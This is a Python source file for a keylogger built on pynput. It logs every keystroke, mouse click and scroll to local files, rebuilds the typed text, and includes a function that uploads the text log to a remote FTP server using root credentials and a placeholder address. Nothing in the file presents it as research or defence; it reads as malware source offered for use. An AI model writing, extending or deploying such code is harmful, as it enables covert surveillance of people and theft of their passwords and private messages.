from pynput import * 
import pandas as pd
from datetime import datetime
from ftplib import FTP
from pathlib import Path

events = 'db.csv'
textlogs = "out.txt"
IP = "0.0.0.0.0"
USER = "root"
PWD = ""

def save_data(x,y,key,state):
	data = pd.DataFrame({"time":str(datetime.now()),"position":f'x:{x}, y:{y}',"key":key,"state":state}, index=[0])
	data.to_csv(events, header=None, index=None, sep=',', mode='a')

def on_click(x, y, button, pressed):
	state = 'Pressed' if pressed else "Released"
	# print(f'{button} {state} at {(x,y)}')
	save_data(x,y,button,state)

def on_scroll(x, y, dx, dy):
	state = "down" if dy < 0 else "up"
	# print(f'Scrolled {state} at {(x,y)}')
	save_data(x,y,"scroll",state)

def on_press(key):
	# print(f'Key {key} pressed.')
	save_data("null","null",key,"Pressed")

def on_release(key):
	# print(f'Key {key} released.')
	save_data("null","null",key,"Released")
	try:
		outstr = key.char
	except:
		try:
			outstr = f'[{key._name_}]'
			raise 
		except:
			outstr = ""
	outstr = " " if str(key) == "Key.space" else outstr
	outstr = "\n" if str(key) == "Key.enter" else outstr
	if str(key) == "Key.backspace":
		a = open(textlogs,"r").read()[:-1]
		open(textlogs,"w").write(a)
		return
	open(textlogs,"a+").write(outstr)

def send_ftp(delete=False):
	file_path = Path(textlogs)

	with FTP(IP,USER,PWD) as ftp, open(file_path, 'rb') as file:
		ftp.storbinary(f'STOR {file_path.name}', file)
		if delete:
			pass #delete textlogs here

while True:
	with mouse.Listener(on_click=on_click,on_scroll=on_scroll) as input_mouse:
		with keyboard.Listener(on_press = on_press,on_release = on_release) as input_keyboard:
			input_mouse.join()
			input_keyboard.join()
